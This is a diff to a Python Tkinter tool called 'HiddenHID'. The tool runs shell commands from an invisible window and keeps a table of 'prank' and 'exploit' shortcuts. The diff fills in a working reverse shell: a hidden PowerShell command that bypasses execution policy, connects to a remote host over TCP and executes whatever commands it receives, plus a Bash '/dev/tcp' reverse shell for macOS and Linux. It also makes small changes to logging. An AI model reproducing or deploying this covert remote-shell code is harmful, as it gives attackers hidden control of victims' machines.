@@ -27,6 +27,8 @@ class App(Tk):
         self.visible = False
         # If there should be extra output
         self.debug = False
+        # If an output file is set
+        self.output = None
         # Actually set up Tkinter
         super().__init__()
 
@@ -36,11 +38,8 @@ class App(Tk):
             # "HiddenHID loaded" will be appended to the file at that location
             if search("^-*o(utput)?=.*$", arg) is not None:
                 outFile = arg.split('=', 1)[1]
-                if self.debug:
-                    print("Output file: " + outFile)
-                with open(outFile, 'a') as file:
-                    file.write('HiddenHID loaded\n')
-                    file.close()
+                self.output = open(outFile, 'a')
+                self.log(f"Output file set to '{outFile}'")
             # The visible argument: "vis" or "visible"
             # Makes the normally invisible window visible, as well as the terminal on macOS
             elif search("^-*v(is)?(ible)?$", arg) is not None:
@@ -49,7 +48,7 @@ class App(Tk):
             # Adds additional output in the terminal, like a -v argument
             elif search("^-*d(ebug)?$", arg) is not None:
                 self.debug = True
-                print("Debug mode enabled")
+                self.log("Debug mode enabled")
 
         # macOS stuff (Darwin = macOS)
         if self.os == "Darwin":
@@ -77,9 +76,22 @@ class App(Tk):
             self.attributes('-alpha', 0)
 
         # Shortcut commands
-        # Reverse shell, coming soon :P
+        # Reverse shell, coming soon(tm) :P
         def revShell(*args):
-            return
+            # Windows' ridiculously long PowerShell script
+            if self.os == "Windows":
+                shell("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(" +
+                      f"{args[0]},{args[1]});$stream = $client.GetStream();" +
+                      "[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
+                      "{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
+                      '$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";'
+                      "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
+                      "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+                      shell=True,
+                      check=False)
+            # The much simpler Bash script for the fancy macOS/Linux bois *sips tea*
+            else:
+                shell(f"sh -i >& /dev/tcp/{args[0]}/{args[1]} 0>&1", shell=True, check=False)
 
         # Shortcut commands, ranging from pranks to exploits
         self.shortcuts = {
@@ -93,12 +105,12 @@ class App(Tk):
                 'volume': 'osascript -e \'set Volume {args[0]}\'',
                 # Set the macOS volume to 0
                 'mute': 'osascript -e \'set Volume 0\'',
-                # Reverse shell
+                # Reverse shell (See above)
                 'shell': revShell
             },
             # Windows shortcuts
             'Windows': {
-                # Reverse shell
+                # Reverse shell (See above)
                 'shell': revShell
             }
         }
@@ -132,6 +144,9 @@ class App(Tk):
             menu.add_cascade(label="Help", menu=submenu)
             self.config(menu=menu)
 
+        # Log that the app has started
+        self.log("HiddenHID loaded successfully\n")
+
     def run_command(self, *args, **kwargs):
         """
         When 'enter' is pressed, run the command in Subprocess
@@ -145,8 +160,7 @@ class App(Tk):
             return
 
         # Debug
-        if self.debug:
-            print(f"Running command '{command}'")
+        self.log(f"Running command '{command}'...")
 
         # Exit if the command is 'exit'
         if command == "exit":
@@ -157,11 +171,10 @@ class App(Tk):
 
         # If the command is a shortcut, run the shortcut
         if splitCommand[0] in self.shortcuts:
+            # Print that a shortcut was detected
+            self.log("-> Shortcut detected! Running a shortcut instead.")
             # The shortcut
             shortcut = self.shortcuts[splitCommand[0]]
-            # Print that a shortcut was detected
-            if self.debug:
-                print('-> Shortcut detected! Converting the command to shortcut...')
             # If the shortcut is a string, run it as a shell script
             if type(shortcut) == str:
                 shell(shortcut.format(args=splitCommand[1:]))
@@ -178,11 +191,17 @@ class App(Tk):
         # Print a new line for a separator between command outputs
         print('')
 
+    def log(self, message: str):
+        if self.debug:
+            print(message)
+            if self.output is not None:
+                self.output.write(message+'\n')
+
     def quit(self):
         """
         Quit the app and close any open terminals
         """
-        print("-> Goodbye")
+        print("Exiting...")
         # macOS stuff
         if self.os == 'Darwin':
             # Kill all terminals
